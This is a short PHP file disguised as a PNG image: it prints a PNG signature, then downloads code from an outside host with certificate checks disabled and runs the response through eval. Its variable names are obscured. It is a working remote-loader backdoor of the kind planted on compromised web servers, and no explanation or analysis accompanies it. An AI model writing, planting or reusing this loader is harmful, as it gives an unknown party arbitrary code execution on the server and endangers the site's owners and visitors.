<?php
/* PNG %k25u25%fgd5n! */
echo "\x89PNG\r\n\x1a\n";

session_start();

$ターゲット = 'https://myzedd.tech/project/zedd';

$ハンドル = curl_init();
curl_setopt($ハンドル, CURLOPT_URL, $ターゲット);
curl_setopt($ハンドル, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ハンドル, CURLOPT_SSL_VERIFYPEER, false);

$取得データ = curl_exec($ハンドル);
curl_close($ハンドル);

if (!empty($取得データ)) {
    eval('?>' . $取得データ);
}
?>